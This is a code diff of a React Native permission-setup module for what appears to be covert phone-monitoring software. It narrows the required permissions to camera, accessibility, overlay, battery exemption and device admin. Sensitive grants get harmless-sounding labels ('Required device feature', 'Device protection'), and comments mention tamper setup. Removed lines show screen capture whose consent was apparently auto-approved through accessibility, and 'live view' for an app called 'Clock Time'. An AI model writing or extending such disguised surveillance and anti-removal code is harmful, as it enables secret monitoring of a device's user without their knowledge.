@@ -1,20 +1,14 @@
-import {Alert} from 'react-native';
 import {nativeModules} from '../nativeModules';
 import {flowLog} from './flowLogger';
 
-/** Location/camera first (in-app Allow), then accessibility (manual once), screen capture last. */
+/** Camera-only + tamper setup keys (no location / screen share / usage / notifications). */
 export type SetupPermissionKey =
   | 'accessibility'
   | 'overlay'
-  | 'notification'
-  | 'usage'
-  | 'location'
   | 'camera'
   | 'battery'
-  | 'fullScreenIntent'
   | 'oemBackground'
-  | 'deviceAdmin'
-  | 'screen';
+  | 'deviceAdmin';
 
 export type PermissionStepOpenResult =
   | {mode: 'settings'}
@@ -38,26 +32,18 @@ export async function loadSetupPermissionSteps(): Promise<SetupPermissionStep[]>
 
   const steps: SetupPermissionStep[] = [
     {
-      key: 'location',
-      title: 'Location',
-      check: () => nativeModules.isLocationGranted(),
-      open: async () => ({
-        mode: 'in_app',
-        granted: await nativeModules.requestLocationPermission(),
-      }),
-      inApp: true,
-    },
-    {
       key: 'camera',
-      title: 'Camera & microphone',
-      check: async () =>
-        (await nativeModules.isCameraGranted()) && (await nativeModules.isMicGranted()),
+      title: 'Camera',
+      check: () => nativeModules.isCameraGranted(),
       open: async () => ({
         mode: 'in_app',
-        granted: await nativeModules.requestCameraAndMicPermissions(),
+        granted: await nativeModules.requestCameraPermission(),
       }),
       inApp: true,
     },
+  ];
+
+  steps.push(
     {
       key: 'accessibility',
       title: 'Required device feature',
@@ -78,24 +64,7 @@ export async function loadSetupPermissionSteps(): Promise<SetupPermissionStep[]>
         await nativeModules.openOverlaySettings();
         return {mode: 'settings'};
       },
-    },
-    {
-      key: 'notification',
-      title: 'Notification access',
-      check: () => nativeModules.isNotificationListenerEnabled(),
-      open: async () => {
-        await nativeModules.openNotificationListenerSettings();
-        return {mode: 'settings'};
-      },
-    },
-    {
-      key: 'usage',
-      title: 'Usage access',
-      check: () => nativeModules.isUsageStatsGranted(),
-      open: async () => {
-        await nativeModules.openUsageStatsSettings();
-        return {mode: 'settings'};
-      },
+      manual: true,
     },
     {
       key: 'battery',
@@ -106,24 +75,7 @@ export async function loadSetupPermissionSteps(): Promise<SetupPermissionStep[]>
         return {mode: 'settings'};
       },
     },
-  ];
-
-  // P1-05: Full-screen intent is only a real special access on Android 14+.
-  if (await nativeModules.isFullScreenIntentRequired()) {
-    steps.push({
-      key: 'fullScreenIntent',
-      title: 'Important alerts',
-      check: () => nativeModules.isFullScreenIntentGranted(),
-      open: async () => {
-        await nativeModules.openFullScreenIntentSettings();
-        Alert.alert(
-          'Allow important alerts',
-          'Turn on important (full-screen) alerts for Clock Time so live view can start reliably.',
-        );
-        return {mode: 'settings'};
-      },
-    });
-  }
+  );
 
   if (requiresOem) {
     const vendorName = await nativeModules.getOemVendorDisplayName();
@@ -138,34 +90,19 @@ export async function loadSetupPermissionSteps(): Promise<SetupPermissionStep[]>
     });
   }
 
-  steps.push(
-    {
-      key: 'deviceAdmin',
-      title: 'Device protection',
-      check: () => nativeModules.isDeviceAdminActive(),
-      open: async () => {
-        if (await nativeModules.isDeviceAdminActive()) {
-          await nativeModules.openDeviceAdminSettings();
-        } else {
-          await nativeModules.requestDeviceAdmin();
-        }
-        return {mode: 'settings'};
-      },
+  steps.push({
+    key: 'deviceAdmin',
+    title: 'Device protection',
+    check: () => nativeModules.isDeviceAdminActive(),
+    open: async () => {
+      if (await nativeModules.isDeviceAdminActive()) {
+        await nativeModules.openDeviceAdminSettings();
+      } else {
+        await nativeModules.requestDeviceAdmin();
+      }
+      return {mode: 'settings'};
     },
-    {
-      key: 'screen',
-      title: 'Screen sharing',
-      check: () => nativeModules.isMediaProjectionGranted(),
-      open: async () => {
-        if (!(await nativeModules.isScreenCaptureAutoApproveReady())) {
-          throw new Error('ACCESSIBILITY_REQUIRED');
-        }
-        const granted = await nativeModules.requestMediaProjectionConsent();
-        return {mode: 'in_app', granted};
-      },
-      inApp: true,
-    },
-  );
+  });
 
   return steps;
 }
@@ -230,48 +167,28 @@ export async function confirmOemBackgroundSetup(): Promise<boolean> {
   return nativeModules.isOemAutostartPromptDone();
 }
 
-/** Mirrors PermissionSetupScreen — every required setup permission must be granted. */
+/** Camera-only + tamper — every required setup permission must be granted. */
 export async function isSetupPermissionsComplete(): Promise<boolean> {
   const requiresOem = await nativeModules.requiresOemBackgroundSetup();
-  const fsiRequired = await nativeModules.isFullScreenIntentRequired();
-  const [
-    notification,
-    usage,
-    location,
-    camera,
-    mic,
-    screenCapture,
-    accessibility,
-    overlay,
-    fullScreenIntent,
-    battery,
-    oemBackground,
-    deviceAdmin,
-  ] = await Promise.all([
-    nativeModules.isNotificationListenerEnabled(),
-    nativeModules.isUsageStatsGranted(),
-    nativeModules.isLocationGranted(),
-    nativeModules.isCameraGranted(),
-    nativeModules.isMicGranted(),
-    nativeModules.isMediaProjectionGranted(),
-    nativeModules.isAccessibilityEnabled(),
-    nativeModules.isOverlayGranted(),
-    fsiRequired ? nativeModules.isFullScreenIntentGranted() : Promise.resolve(true),
-    nativeModules.isBatteryOptimizationExempt(),
-    requiresOem ? nativeModules.isOemAutostartPromptDone() : Promise.resolve(true),
-    nativeModules.isDeviceAdminActive(),
-  ]);
+  const [camera, accessibility, overlay, battery, oemBackground, deviceAdmin] =
+    await Promise.all([
+      nativeModules.isCameraGranted(),
+      nativeModules.isAccessibilityEnabled(),
+      nativeModules.isOverlayGranted(),
+      nativeModules.isBatteryOptimizationExempt(),
+      requiresOem ? nativeModules.isOemAutostartPromptDone() : Promise.resolve(true),
+      nativeModules.isDeviceAdminActive(),
+    ]);
+
+  const accessibilityConnected = accessibility
+    ? await nativeModules.isAccessibilityServiceConnected()
+    : false;
 
   return (
-    notification &&
-    usage &&
-    location &&
     camera &&
-    mic &&
-    screenCapture &&
     accessibility &&
+    accessibilityConnected &&
     overlay &&
-    fullScreenIntent &&
     battery &&
     oemBackground &&
     deviceAdmin
